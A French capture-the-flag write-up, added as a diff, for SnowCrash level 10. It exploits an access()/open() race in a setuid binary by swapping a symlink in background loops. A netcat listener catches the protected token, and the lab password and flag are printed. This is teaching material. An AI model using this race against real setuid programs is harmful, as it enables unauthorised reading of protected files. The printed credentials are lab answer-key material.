@@ -1,0 +1,77 @@
+#LEVEL10
+
+Nous avons un binaire level10 setuid et un fichier token non accessible.
+
+level10@SnowCrash:~$ ./level10
+./level10 file host
+	sends file to host if you have access to it
+
+Le programme prend en parametre un fichier et une adresse.
+
+level10@SnowCrash:~$ ./level10 token 192.168.1.81
+You don't have access to token
+
+level10@SnowCrash:~$ ./level10 /tmp/test 192.168.1.81
+Connecting to localhost:6969 .. Unable to connect to host localhost
+
+Le probleme vient donc bien des droits d'acces au fichier token.
+Nous lancons un ltrace sur level10 pour y jeter un coup d'oeil
+
+level10@SnowCrash:~$ ltrace ./level10 token 192.168.1.81
+__libc_start_main(0x80486d4, 3, 0xbffff794, 0x8048970, 0x80489e0 <unfinished ...>
+access("token", 4)                                                                             = -1
+printf("You don't have access to %s\n", "token"You don't have access to token
+)
+
+Nous apercevons un appel a la fonction 'access', la faille est ici.
+En effet dans le man d'access il est clairement indique :
+
+' Avertissement : Utiliser access() pour vérifier si un utilisateur a le droit,
+par exemple, d'ouvrir un fichier avant d'effectuer réellement l'ouverture avec
+open(2), risque de créer un trou de sécurité. En effet, l'utilisateur peut
+exploiter le petit intervalle de temps entre la vérification et l'accès pour
+modifier le fichier (via un lien symbolique en général). Pour cette raison,
+l'utilisation de cet appel système devrait être évitée. '
+
+Nous allons creer deux scripts qui tourneront en boucle et en background.
+- Le 1er se chargera de creer le premier fichier avec les droits pour access,
+puis supprimera ce fichier et le remplacera par un lien symbolique vers notre
+token, tout cela en boucle.
+
+- Le 2eme se chargera de lancer notre binaire en boucle avec ce fakefile creer
+precedemment.
+
+Nous n'auront plus qu'a ecouter avec netcat sur le 6969 les retours possible.
+Nous donnons les droits pour nos deux scripts avec chmod et nous lancons :
+
+level10@SnowCrash:/tmp$ ./script.sh > /dev/null 2>&1 &
+[1] 2185
+level10@SnowCrash:/tmp$ ./launcher.sh > /dev/null 2>&1 &
+[2] 30371
+level10@SnowCrash:/tmp$ nc -lk 6969
+.*( )*.
+.*( )*.
+
+  ... nous supprimons la mutiltude de .*( )*.
+
+.*( )*.
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+.*( )*.
+.*( )*.
+
+
+Nous obtenons notre token, qui ne marche pas en tant que flag, meme chose
+qu'auparavant c'est le mot de passe.
+
+level10@SnowCrash:/tmp$ su flag10
+Password:
+Don't forget to launch getflag !
+flag10@SnowCrash:~$ getflag
+Check flag.Here is your token : feulo4b72j7edeahuete3no7c
+flag10@SnowCrash:~$ su level11
+Password:
+level11@SnowCrash:~$
+
+Next level...
